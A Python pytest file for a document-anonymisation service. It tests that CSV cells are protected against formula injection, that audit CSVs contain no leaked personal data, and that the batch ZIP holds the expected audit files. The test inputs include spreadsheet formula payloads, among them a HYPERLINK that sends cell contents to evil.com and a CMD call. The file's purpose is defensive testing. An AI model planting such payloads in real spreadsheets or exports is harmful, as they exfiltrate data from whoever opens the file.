import os
import io
import csv
import zipfile
import pytest
import asyncio
from pathlib import Path

from backend.services.sessions import session_store
from backend.services.batch import batch_service, get_batch_config
from backend.services.csv_audit import sanitize_csv_cell, generate_batch_audit_csv, generate_batch_audit_entities_csv
from backend.fixtures_generator import FIXTURES_DIR, generate_all_fixtures
from backend.models import DocumentMetadata, BatchMetadata

@pytest.fixture(scope="session", autouse=True)
def ensure_fixtures():
    generate_all_fixtures()

def test_csv_formula_injection_defense():
    """
    Test explicit formula injection attacks across all relevant triggers:
    =, +, -, @, \t, \r and leading spaces.
    Must prefix with ' to neutralize execution in Excel/LibreOffice/Sheets.
    """
    adversarial_inputs = [
        '=HYPERLINK("http://evil.com?leak="&A1,"Click")',
        '+SUM(1,1)',
        ' +SUM(1,1)',
        '@SUM(1,1)',
        '\t=CMD("calc")',
        '\r=1+1',
        '-100*5',
        '=1+1',
        '   @AVERAGE(1,2)'
    ]
    
    for inp in adversarial_inputs:
        sanitized = sanitize_csv_cell(inp)
        assert sanitized.startswith("'"), f"Failed to neutralize formula injection on: {inp} -> {sanitized}"

    # Safe inputs must not be modified
    safe_inputs = ["document-001.pdf", "rrhh", "sha256:abcd", "verified", "12345"]
    for s in safe_inputs:
        assert sanitize_csv_cell(s) == s

def test_csv_batch_audit_zero_pii_and_pseudonymization():
    """
    CRITICAL PRIVACY TEST:
    Verify that source_filename with PII or formulas is sanitized and pseudonymized as document-XXX.
    Verify that NO sensitive fixture strings appear in batch-audit.csv or batch-audit-entities.csv.
    """
    session_id = "test_sess_csv_privacy"
    session_store.create_session(session_id)
    batch_id = "b_csv_test"
    
    batch = BatchMetadata(id=batch_id, session_id=session_id, default_profile_id="rrhh")
    session_store.batches[batch_id] = batch
    
    # Doc 1 with malicious filename containing formula + fake PII
    d1_id = "doc_csv_1"
    d1_dir = session_store.get_document_dir(session_id, batch_id, d1_id)
    d1_file = os.path.join(d1_dir, "sample.pdf")
    with open(os.path.join(FIXTURES_DIR, "sample_rrhh_payroll.pdf"), "rb") as fi, open(d1_file, "wb") as fo:
        fo.write(fi.read())
        
    d1_meta = DocumentMetadata(
        id=d1_id, session_id=session_id, batch_id=batch_id,
        filename='=HYPERLINK("http://evil.com", "Carmenchu_12345678Z.pdf")',
        mime_type="application/pdf", size_bytes=os.path.getsize(d1_file),
        profile_id="rrhh", source_sha256="fake_sha_123", status="queued"
    )
    session_store.documents[d1_id] = d1_meta
    session_store.doc_file_paths[d1_id] = {"source": d1_file}
    batch.document_ids.append(d1_id)
    
    # Execute workflow
    asyncio.run(batch_service.analyze_document_in_batch(d1_id, batch_id))
    for m in session_store.matches[d1_id].values():
        m.status = "accepted"
    asyncio.run(batch_service.purge_document_in_batch(d1_id, batch_id))
    
    # Generate CSVs
    summary = batch_service.generate_batch_audit_summary(batch_id)
    csv_text = generate_batch_audit_csv(summary)
    entities_csv_text = generate_batch_audit_entities_csv(summary, session_store)
    
    # 1. Verify UTF-8 BOM
    assert csv_text.startswith("\ufeff")
    assert entities_csv_text.startswith("\ufeff")
    
    # 2. Verify zero PII in CSVs
    sensitive_tokens = [
        "12345678Z", "ES91 2100 0418 4502 0005 1332",
        "Carmenchu", "García Moreno", "28 12345678 40"
    ]
    for token in sensitive_tokens:
        assert token not in csv_text, f"PII leak detected in batch-audit.csv: {token}"
        assert token not in entities_csv_text, f"PII leak detected in batch-audit-entities.csv: {token}"
        
    # 3. Verify pseudonymized safe filename (e.g. document-001.pdf)
    assert "document-001.pdf" in csv_text
    assert "=HYPERLINK" not in csv_text
    
    # 4. Parse CSV rows with standard reader
    reader = csv.reader(io.StringIO(csv_text.lstrip("\ufeff")), delimiter=",")
    rows = list(reader)
    header = rows[0]
    assert "batch_id" in header
    assert "document_id" in header
    assert "source_filename" in header
    assert "output_sha256" in header
    
    data_row = rows[1]
    # Check 1:1 counts match canonical summary
    idx_detected = header.index("detected_count")
    idx_accepted = header.index("accepted_count")
    idx_status = header.index("status")
    
    assert data_row[idx_status] == "verified"
    assert int(data_row[idx_detected]) == summary["documents"][0]["matches_count"]
    assert int(data_row[idx_accepted]) == summary["documents"][0]["accepted_count"]

def test_csv_audit_files_in_batch_zip():
    """Verify ZIP contains batch-audit.csv and batch-audit-entities.csv alongside json and pdf"""
    session_id = "test_sess_csv_zip"
    session_store.create_session(session_id)
    batch_id = "b_zip_csv"
    
    batch = BatchMetadata(id=batch_id, session_id=session_id, default_profile_id="rrhh")
    session_store.batches[batch_id] = batch
    
    d_id = "doc_zip_csv_1"
    d_dir = session_store.get_document_dir(session_id, batch_id, d_id)
    d_file = os.path.join(d_dir, "test.pdf")
    with open(os.path.join(FIXTURES_DIR, "sample_soporte_incident.pdf"), "rb") as fi, open(d_file, "wb") as fo:
        fo.write(fi.read())
        
    d_meta = DocumentMetadata(
        id=d_id, session_id=session_id, batch_id=batch_id,
        filename="test.pdf", mime_type="application/pdf",
        size_bytes=os.path.getsize(d_file), profile_id="soporte",
        source_sha256="fake_sha_soporte", status="queued"
    )
    session_store.documents[d_id] = d_meta
    session_store.doc_file_paths[d_id] = {"source": d_file}
    batch.document_ids.append(d_id)
    
    asyncio.run(batch_service.analyze_document_in_batch(d_id, batch_id))
    for m in session_store.matches[d_id].values():
        m.status = "accepted"
    asyncio.run(batch_service.purge_document_in_batch(d_id, batch_id))
    
    zip_path = batch_service.build_batch_zip(batch_id)
    assert os.path.exists(zip_path)
    
    with zipfile.ZipFile(zip_path, "r") as zf:
        names = zf.namelist()
        assert "batch-audit.json" in names
        assert "batch-audit.pdf" in names
        assert "batch-audit.csv" in names
        assert "batch-audit-entities.csv" in names
        assert any(n.startswith("documents/") for n in names)
